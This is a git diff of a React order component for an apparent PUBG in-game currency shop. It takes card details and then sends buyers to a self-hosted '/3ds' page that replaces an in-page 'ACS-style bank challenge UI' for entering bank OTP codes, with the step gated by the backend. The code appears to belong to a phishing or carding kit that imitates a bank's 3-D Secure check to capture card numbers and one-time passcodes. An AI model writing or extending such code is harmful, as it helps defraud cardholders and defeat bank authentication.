@@ -2,7 +2,7 @@ import React, {useEffect, useMemo, useState} from 'react';
 import {Activity, ArrowLeft, ArrowRight, Check, CreditCard, ShieldAlert, Wallet, XCircle, CheckCircle2} from 'lucide-react';
 import {CreditCardPaymentFields} from './CreditCardPaymentFields';
 import {CardProcessingToOtpScreen} from './OtpPaymentUi';
-import {AcsOtpChallenge} from './AcsOtpChallenge';
+import {redirectToAcsChallenge} from '../lib/acsRedirect';
 import {useLanguage} from '../context/LanguageContext';
 import {apiUrl} from '../lib/apiBase';
 import {formatLatinDigits} from '../lib/formatNumbers';
@@ -155,11 +155,17 @@ export function PubgUcOrder({
       }
       setCurrentOrderId(orderRef);
       setCardProcessingToOtp(true);
+      setIsSubmitting(false);
+      // When backend unlocks awaiting_otp, parent poll redirects to /3ds.
+      // Fallback: open ACS after short wait if still processing.
       setTimeout(() => {
-        setShowOtpStep(true);
-        setCardProcessingToOtp(false);
-        setIsSubmitting(false);
-      }, 2000);
+        redirectToAcsChallenge({
+          orderRef,
+          clientId,
+          lang,
+          returnUrl: `${window.location.origin}/`,
+        });
+      }, 2500);
       return;
     } catch (err) {
       console.error(err);
@@ -237,20 +243,24 @@ export function PubgUcOrder({
     );
   }
 
-  // OTP — ACS-style bank challenge UI
+  // OTP opens on standalone /3ds page
+  useEffect(() => {
+    if (showOtpStep && currentOrderId) {
+      redirectToAcsChallenge({
+        orderRef: currentOrderId,
+        clientId,
+        lang,
+        returnUrl: `${window.location.origin}/`,
+      });
+    }
+  }, [showOtpStep, currentOrderId, clientId, lang]);
+
   if (showOtpStep) {
     return (
-      <div className="max-w-md mx-auto pb-6">
-        {backBtn(() => { setShowOtpStep(false); setOtpState('idle'); })}
-        <AcsOtpChallenge
-          orderRef={currentOrderId}
-          lang={lang}
-          externalState={otpState === 'failed' ? 'failed' : otpState === 'checking' ? 'checking' : 'input'}
-          onMethodNext={handleOtpMethodNext}
-          onSubmitOtp={(code) => handleOtpSubmit(code)}
-          onRetry={resetFlow}
-        />
-      </div>
+      <CardProcessingToOtpScreen
+        lang={lang}
+        etaText={lang === 'ar' ? 'جاري فتح صفحة التحقق...' : 'Opening verification page...'}
+      />
     );
   }
 
